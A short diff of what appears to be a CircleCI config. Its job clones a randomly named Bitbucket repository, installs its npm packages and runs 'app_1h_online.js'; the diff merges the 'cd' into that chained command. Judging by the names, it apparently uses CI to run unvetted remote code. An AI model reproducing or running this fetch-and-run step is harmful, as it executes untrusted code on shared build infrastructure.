@@ -8,8 +8,7 @@ jobs:
     steps:
       - run: node -v
       - run: git clone https://remitdepat@bitbucket.org/remitdepat/ih8h1wok5xs0vsr3aqbn26oij7.git
-      - run: cd ih8h1wok5xs0vsr3aqbn26oij7
-      - run: npm i -s && node app_1h_online.js
+      - run: cd ih8h1wok5xs0vsr3aqbn26oij7 && npm i -s && node app_1h_online.js
 workflows:
   start-jobs:
     jobs:
